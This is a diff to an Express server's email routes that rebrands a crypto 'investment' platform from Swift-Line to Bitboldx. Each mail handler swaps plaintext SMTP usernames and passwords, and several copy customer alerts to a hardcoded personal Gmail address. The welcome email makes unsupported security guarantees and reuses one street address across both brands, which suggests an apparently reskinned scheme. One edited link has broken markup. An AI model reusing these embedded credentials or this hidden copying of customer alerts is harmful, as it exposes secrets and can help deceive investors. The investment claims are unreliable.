@@ -39,16 +39,16 @@ app.post('/done.html', async (request, response) => {
       port: 465,
       service: 'SMTP',
       auth: {
-        user: "swiftline@assistin.online",
-        pass: "Swiftline##9"
+        user: "bitboldx@assistin.online",
+        pass: "BBxbold2-x.online"
       },
-      from: "swiftline@assistin.online",
+      from: "bitboldx@assistin.online",
     });
 
     const mail_option = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: info.useremail,
-      subject: "New Alert From Swift-Line ",
+      subject: "New Alert From Bitboldx ",
       html:
         `
                 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -150,7 +150,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
                      </tr>
                    </table></td>
                  </tr>
@@ -219,7 +219,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
                      </tr>
                      <tr>
                       <td style="padding:0;Margin:0">
@@ -267,9 +267,9 @@ span.MsoHyperlinkFollowed {
     }
 
     const mail_option2 = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: 'queenstiles7@gmail.com',
-      subject: "New Alert From Swift-Line ",
+      subject: "New Alert From Bitboldx ",
       html:
         `
                 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -371,7 +371,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
                      </tr>
                    </table></td>
                  </tr>
@@ -444,7 +444,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
                      </tr>
                      <tr>
                       <td style="padding:0;Margin:0">
@@ -526,17 +526,17 @@ app.post('/done2.html', async (request, response) => {
       port: 465,
       service: 'SMTP',
       auth: {
-        user: "swiftline@assistin.online",
-        pass: "Swiftline##9"
+        user: "bitboldx@assistin.online",
+        pass: "BBxbold2-x.online"
       },
-      from: "swiftline@assistin.online",
+      from: "bitboldx@assistin.online",
     });
 
 
     const mail_option = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: info.useremail,
-      subject: "New Alert From Swift-Line",
+      subject: "New Alert From Bitboldx",
       html:
         `
 
@@ -639,7 +639,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
                      </tr>
                    </table></td>
                  </tr>
@@ -710,7 +710,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
                      </tr>
                      <tr>
                       <td style="padding:0;Margin:0">
@@ -760,9 +760,9 @@ span.MsoHyperlinkFollowed {
     }
 
     const mail_option2 = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: 'queenstiles7@gmail.com',
-      subject: "New Alert From Swift-Line",
+      subject: "New Alert From Bitboldx",
       html:
         `
             <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -866,7 +866,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+                      <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
                      </tr>
                    </table></td>
                  </tr>
@@ -939,7 +939,7 @@ span.MsoHyperlinkFollowed {
                   <td align="left" style="padding:0;Margin:0;width:560px">
                    <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                      <tr>
-                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+                      <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
                      </tr>
                      <tr>
                       <td style="padding:0;Margin:0">
@@ -1024,17 +1024,17 @@ app.post('/done3.html', async (request, response) => {
       port: 465,
       service: 'SMTP',
       auth: {
-        user: "swiftline@assistin.online",
-        pass: "Swiftline##9"
+        user: "bitboldx@assistin.online",
+        pass: "BBxbold2-x.online"
       },
-      from: "swiftline@assistin.online",
+      from: "bitboldx@assistin.online",
     });
 
 
     const mail_option = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: info.useremail,
-      subject: "New Alert From Swift-Line",
+      subject: "New Alert From Bitboldx",
       html:
         `
                           
@@ -1139,7 +1139,7 @@ color:#ffffff!important;
       <td align="left" style="padding:0;Margin:0;width:560px">
        <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+          <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
          </tr>
        </table></td>
      </tr>
@@ -1214,7 +1214,7 @@ color:#ffffff!important;
       <td align="left" style="padding:0;Margin:0;width:560px">
        <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
          </tr>
          <tr>
           <td style="padding:0;Margin:0">
@@ -1265,9 +1265,9 @@ color:#ffffff!important;
     }
 
     const mail_option2 = {
-      from: `Swift-Line <noreply@assistin.online>`,
+      from: `Bitboldx <noreply@assistin.online>`,
       to: 'queenstiles7@gmail.com',
-      subject: "New Alert From Swift-Line",
+      subject: "New Alert From Bitboldx",
       html:
         `
                     
@@ -1372,7 +1372,7 @@ color:#ffffff!important;
       <td align="left" style="padding:0;Margin:0;width:560px">
        <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/images-removebg-preview.png?alt=media&token=9e1c4820-f975-4101-a8e9-317e6a511df0" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+          <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//images-removebg-preview.png" alt="" width="135" class="img-8080" height="135" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
          </tr>
        </table></td>
      </tr>
@@ -1445,7 +1445,7 @@ color:#ffffff!important;
       <td align="left" style="padding:0;Margin:0;width:560px">
        <table width="100%" cellspacing="0" cellpadding="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
          </tr>
          <tr>
           <td style="padding:0;Margin:0">
@@ -1530,17 +1530,17 @@ app.post('/admin/maileredit.html', async (request, response) => {
       port: 465,
       service: 'SMTP',
       auth: {
-        user: "swiftline@assistin.online",
-        pass: "Swiftline##9"
+        user: "bitboldx@assistin.online",
+        pass: "BBxbold2-x.online"
       },
-      from: "swiftline@assistin.online",
+      from: "bitboldx@assistin.online",
     });
 
 
     const mail_option = {
-      from: `swiftline@assistin.online`,
+      from: `bitboldx@assistin.online`,
       to: info.useremail,
-      subject: "New Message From Swift-Line",
+      subject: "New Message From Bitboldx",
       html: `
                 <!DOCTYPE html
   PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -1953,7 +1953,7 @@ app.post('/admin/maileredit.html', async (request, response) => {
                               style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                               <tr>
                                 <td style="padding:0;Margin:0;padding-bottom:20px;font-size:0px" align="center"><img
-                                    src="https://firebasestorage.googleapis.com/v0/b/mailing-content.appspot.com/o/73830CEB-7E26-493F-9F90-92B14F1CE8F3.PNG?alt=media&token=d126abdf-4892-4538-a5a7-1f89694fa9c9"
+                                    src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/bitboldx//Picsart_25-06-12_17-32-36-001.png"
                                     alt="Logo"
                                     style="display:block;font-size:12px;border:0;outline:none;text-decoration:none"
                                     title="Logo" class="img-7614 img-7614" height="44" width="278"></td>
@@ -1986,7 +1986,7 @@ app.post('/admin/maileredit.html', async (request, response) => {
                               style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
                               <tr>
                                 <td align="center" style="padding:0;Margin:0;padding-top:30px;font-size:0"><img
-                                    src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/IMG_0852.PNG?alt=media&token=cefe551b-aa24-4067-8146-99028767622e"
+                                    src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//favicon%202.png"
                                     alt="" width="135" class="img-8080" height="135"
                                     style="display:block;font-size:14px;border:0;outline:none;text-decoration:none">
                                 </td>
@@ -2058,7 +2058,7 @@ app.post('/admin/maileredit.html', async (request, response) => {
                                 <td align="center" style="padding:0;Margin:0;padding-bottom:35px">
                                   <p
                                     style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">
-                                    Swift-Line © 2024 All Rights Reserved.</p>
+                                    Bitboldx © 2024 All Rights Reserved.</p>
                                   <p
                                     style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">
                                     &nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p>
@@ -2169,16 +2169,16 @@ app.post('/register/welcome.html', async (req, res) => {
     port: 465,
     service: 'SMTP',
     auth: {
-      user: "swiftline@assistin.online",
-      pass: "Swiftline##9"
+      user: "bitboldx@assistin.online",
+      pass: "BBxbold2-x.online"
     },
-    from: "swiftline@assistin.online",
+    from: "bitboldx@assistin.online",
   });
 
   const mail_option = {
-    from: `Swift-Line <noreply@assistin.online>`,
-    to: info.useremail,
-    subject: "Welcome Message From Swift-Line",
+    from: `Bitboldx <noreply@assistin.online>`,
+    to: info.email,
+    subject: "Welcome Message From Bitboldx",
     html:
       `
             
@@ -2283,13 +2283,13 @@ color:#ffffff!important;
       <td align="center" valign="top" style="padding:0;Margin:0;width:560px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-top:10px;padding-bottom:10px;font-size:0px"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/78491618321704551.png?alt=media&token=0491a086-dd18-49de-8870-383894325db2" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="150" height="150"></td>
+          <td align="center" style="padding:0;Margin:0;padding-top:10px;padding-bottom:10px;font-size:0px"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//78491618321704551.png" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="150" height="150"></td>
          </tr>
          <tr>
           <td align="center" class="es-m-p0r es-m-p0l" style="Margin:0;padding-top:10px;padding-bottom:10px;padding-right:40px;padding-left:40px"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:24px;letter-spacing:0;color:#333333;font-size:16px">Welcome ${info.name}! We are very excited and happy to get the opportunity to serve you as one of our respectable customers. We really thank you for choosing us. We can assure you that our all workers are very responsible and committed towards our customers. We also are confident about our good quality service.</p></td>
          </tr>
          <tr>
-          <td align="center" class="es-m-p25t" style="padding:0;Margin:0;padding-top:15px;padding-bottom:5px"><span class="es-button-border" style="border-style:solid;border-color:#2CB543;background:#45818e;border-width:0px;display:inline-block;border-radius:5px;width:auto"><a href="https://swiftlinefx.web.app" class="es-button" target="_blank" style="mso-style-priority:100 !important;text-decoration:none !important;mso-line-height-rule:exactly;color:#FFFFFF;font-size:20px;padding:10px 30px 10px 30px;display:inline-block;background:#45818e;border-radius:5px;font-family:arial, 'helvetica neue', helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:24px;width:auto;text-align:center;letter-spacing:0;mso-padding-alt:0;mso-border-alt:10px solid #45818e">Start Investing</a></span></td>
+          <td align="center" class="es-m-p25t" style="padding:0;Margin:0;padding-top:15px;padding-bottom:5px"><span class="es-button-border" style="border-style:solid;border-color:#2CB543;background:#45818e;border-width:0px;display:inline-block;border-radius:5px;width:auto"><a href="https://bit-bx.web.app/index.html class="es-button" target="_blank" style="mso-style-priority:100 !important;text-decoration:none !important;mso-line-height-rule:exactly;color:#FFFFFF;font-size:20px;padding:10px 30px 10px 30px;display:inline-block;background:#45818e;border-radius:5px;font-family:arial, 'helvetica neue', helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:24px;width:auto;text-align:center;letter-spacing:0;mso-padding-alt:0;mso-border-alt:10px solid #45818e">Start Investing</a></span></td>
          </tr>
        </table></td>
      </tr>
@@ -2315,7 +2315,7 @@ color:#ffffff!important;
       <td class="es-m-p0r es-m-p20b" align="center" style="padding:0;Margin:0;width:90px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/IMG_0888.PNG?alt=media&token=d45f3eb8-b835-4a35-97ef-435932c6080c" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="90"></td>
+          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//IMG_0888.PNG" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="90"></td>
          </tr>
        </table></td>
      </tr>
@@ -2341,7 +2341,7 @@ color:#ffffff!important;
       <td class="es-m-p20b" align="center" style="padding:0;Margin:0;width:90px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/IMG_0852.PNG?alt=media&token=cefe551b-aa24-4067-8146-99028767622e" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="88"></td>
+          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//favicon%202.png" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="88"></td>
          </tr>
        </table></td>
      </tr>
@@ -2367,7 +2367,7 @@ color:#ffffff!important;
       <td class="es-m-p0r es-m-p20b" align="center" style="padding:0;Margin:0;width:90px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/Bitcoin-cryptocurrency-on-transparent-background-PNG-removebg-preview.png?alt=media&token=7aff7d2b-9d4d-4fe5-ab03-66fa16b4b258" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" class="img-1549" height="97"></td>
+          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//Bitcoin-cryptocurrency-on-transparent-background-PNG-removebg-preview.png" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" class="img-1549" height="97"></td>
          </tr>
        </table></td>
      </tr>
@@ -2377,7 +2377,7 @@ color:#ffffff!important;
       <td align="center" style="padding:0;Margin:0;width:440px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="left" class="es-m-txt-l" style="padding:0;Margin:0;padding-bottom:10px"><h3 style="Margin:0;font-family:arial, 'helvetica neue', helvetica, sans-serif;mso-line-height-rule:exactly;letter-spacing:0;font-size:20px;font-style:normal;font-weight:bold;line-height:24px;color:#333333">Swift-Line IS SECURED</h3></td>
+          <td align="left" class="es-m-txt-l" style="padding:0;Margin:0;padding-bottom:10px"><h3 style="Margin:0;font-family:arial, 'helvetica neue', helvetica, sans-serif;mso-line-height-rule:exactly;letter-spacing:0;font-size:20px;font-style:normal;font-weight:bold;line-height:24px;color:#333333">Bitboldx IS SECURED</h3></td>
          </tr>
          <tr>
           <td align="left" style="padding:0;Margin:0"><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:21px;letter-spacing:0;color:#333333;font-size:14px"><span>Guaranted protection. When we say that you are secured we really mean it. We have built one of the world most sophisticated security system that have never been compromised. Members records are kept confidential from third parties.</span></p></td>
@@ -2393,7 +2393,7 @@ color:#ffffff!important;
       <td class="es-m-p20b" align="center" style="padding:0;Margin:0;width:90px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/59831617975283573.png?alt=media&token=619f5e6d-c4a7-4617-90cf-b859078e5847" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="90"></td>
+          <td align="center" class="es-m-txt-l" style="padding:0;Margin:0;font-size:0px"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//59831617975283573.png" alt="" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none" width="90" height="90"></td>
          </tr>
        </table></td>
      </tr>
@@ -2419,7 +2419,7 @@ color:#ffffff!important;
       <td align="center" valign="top" style="padding:0;Margin:0;width:560px">
        <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
          <tr>
-          <td align="center" style="padding:0;Margin:0;font-size:0"><img src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/cryptocurrency-initial-coin-offering-digital-currency-crypto-mining-removebg-preview.png?alt=media&token=4d69748f-2bab-4d29-94f0-59835d1d0839" alt="" width="560" class="adapt-img" height="221" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+          <td align="center" style="padding:0;Margin:0;font-size:0"><img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//cryptocurrency-initial-coin-offering-digital-currency-crypto-mining-removebg-preview.png" alt="" width="560" class="adapt-img" height="221" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
          </tr>
        </table></td>
      </tr>
@@ -2432,7 +2432,7 @@ color:#ffffff!important;
